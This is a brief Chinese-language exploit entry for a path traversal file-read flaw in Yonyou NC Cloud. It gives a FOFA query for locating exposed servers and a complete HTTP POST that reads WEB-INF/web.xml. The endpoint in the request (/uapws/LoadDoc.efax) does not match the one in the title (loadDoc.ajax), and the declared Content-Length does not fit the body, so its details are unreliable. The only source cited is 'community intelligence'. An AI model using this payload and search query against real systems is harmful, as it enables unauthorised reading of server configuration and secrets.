## 用友NC Cloud loadDoc.ajax 任意文件读取漏洞

## 漏洞描述
用友NC Cloud `loadDoc.ajax` 接口存在路径穿越，攻击者可读取任意文件，导致敏感信息泄露。

## 网络空间测绘
```
fofa: app="用友-NC-Cloud"
```

## POC
```
POST /uapws/LoadDoc.efax HTTP/1.1
Host: [请补充实际域名]
User-Agent: Mozilla/5.0 (ZZ; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36
Accept-Encoding: gzip
Content-Type: application/x-www-form-urlencoded
Content-Length: 27

ws=../../../../WEB-INF/web.xml
```
## 参考
- 社区情报

